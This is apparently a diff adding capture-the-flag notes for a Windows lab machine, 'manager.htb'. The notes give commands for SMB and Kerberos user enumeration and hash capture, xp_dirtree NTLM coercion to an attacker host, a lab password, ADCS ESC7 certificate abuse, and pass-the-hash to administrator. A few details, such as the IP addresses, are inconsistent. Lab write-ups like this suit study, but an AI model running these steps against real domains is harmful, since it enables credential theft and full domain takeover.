@@ -1,0 +1,107 @@
+This windows box has a lot of ports open for us to enumerate
+
+dig @manager.htb -x 10.129.152.42 ==> Enumeration For Domain
+
+Box Dom Details {
+	dc01.manager.htb
+	manager.htb
+}
+
+```SMB
+┌──(ender㉿UnDefineCS)-[~/Documents/WindowsMachines/Manager]
+└─$ smbclient -L manager.htb
+Password for [WORKGROUP\ender]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share --> Viewable
+        SYSVOL          Disk      Logon server share --> Viewable
+        
+smbclient //domain/volume ==> Enter Share :: had to add dc01.manager.htb but get hit with "NT_STATUS_ACCESS_DENIED listing \*"
+
+We should use a different approach to Enumerating SMB, lets use CME!
+  1.) crackmapexec smb 10.129.152.42 -u 'guest' -p '' ==> Check if we can login as guest
+  2.) crackmapexec smb 10.129.152.42 -u '' -p '' ==> Check if we can login as annonymous
+  
+  3.) crackmapexec smb 10.129.152.42 -u 'USER' -p 'PASS' --shares ==> Check for readable shares
+  4.) crackmapexec smb 10.129.152.42 -u 'guest' -p '' --rid-brute ==> Enums possible users and other information, we can use this info for brute forcing!
+
+  5.) impacket-GetNPUsers -dc-ip 10.128.152.42 -usersfile users.txt manager.htb/ ==> Brute force users and try to capture hashes!
+  6.) kerbrute userenum users.txt --dc manager.htb -d manager.htb -t 100 ==> validate users via kerberos
+```
+
+```MSSQL
+	impacket-mssqlclient -windows-auth manager.htb/operator:'operator'@manager.htb ==> logs us into the service as operator
+	
+	**SELECT name FROM master.sys.databases** --> See DBS
+	master --> operator access
+		spt_fallback_db
+		spt_fallback_dev
+		spt_fallback_usg
+		spt_values
+		spt_monitor
+	tempdb --> operator access
+		no tables
+	model ==> access denied
+	msdb --> operator access
+		syspolicy_policy_category_subscriptions
+		syspolicy_system_health_state
+		syspolicy_policy_execution_history
+		syspolicy_policy_execution_history_details
+		syspolicy_configuration
+		syspolicy_conditions
+		syspolicy_policy_categories
+		sysdac_instances
+		syspolicy_object_sets
+		dm_hadr_automatic_seeding_history
+		syspolicy_policies
+		backupmediaset
+		backupmediafamily
+		backupset
+		autoadmin_backup_configuration_summary
+		backupfile
+		syspolicy_target_sets
+		restorehistory 
+		restorefile
+		syspolicy_target_set_levels
+		restorefilegroup
+		logmarkhistory 
+		suspect_pages
+	
+	EXEC master..xp_dirtree '\\IP\share\' --> use sudo responder -I tun0 to get the NTML hash
+	
+	EXEC xp_dirtree 'C:\', 2, 1 ==> Lists files
+		If we go into the IIS webroot we can see a zip file, we can make a get request to download
+		the zip file and upon view of its contents we get a credential
+		
+	impacket-mssqlclient -windows-auth manager.htb/raven:'R4v3nBe5tD3veloP3r!123'@manager.htb ==> Login under raven
+```
+raven@manager.htb:R4v3nBe5tD3veloP3r!123 ==> evil-winrm **REMEMBER THE ! NEEDS A \ OR ELSE THE COMMAND BREAKS**
+
+After downloading certipy v.4.8.0, we can run a simple command found on
+hacktricks to get any possible vulns with the ADCS
+
+We get told we can exploit ESC7 : `Vulnerable Certificate Authority Access Control - ESC7`
+
+  :: Abuse ::
+  1.) ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password "R4v3nBe5tD3veloP3r\!123"
+  
+  2.) ca -ca 'manager-DC01-CA' -username raven@manager.htb -password "R4v3nBe5tD3veloP3r\!123" -enable-template 'SubCA'
+  
+  3.) req -username raven@manager.htb -password "R4v3nBe5tD3veloP3r\!123" -ca 'manager-DC01-CA' -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
+  
+  4.) ca -ca 'manager-DC01-CA' -issue-request <ID> -username raven@manager.htb -password "R4v3nBe5tD3veloP3r\!123"
+  
+  5.) req -username raven@manager.htb -password "R4v3nBe5tD3veloP3r\!123" -ca 'manager-DC01-CA' -target dc01.manager.htb -retrieve <ID>
+  
+  6.) certipy auth -dc-ip 10.129.153.34 -u "administrator" -pfx administrator.pfx --> get the hash
+  
+  7.) impacket-psexec administrator@manager.htb -hashes "hash from step 6"
+ :: Abuse End ::
+
+After getting the administrator.pfx, we need to now use john to crack this password:
+	1.) pfx2john administrator.pfx > admin.hash
+	2.) john -wordlist=rockyou.txt admin.hash
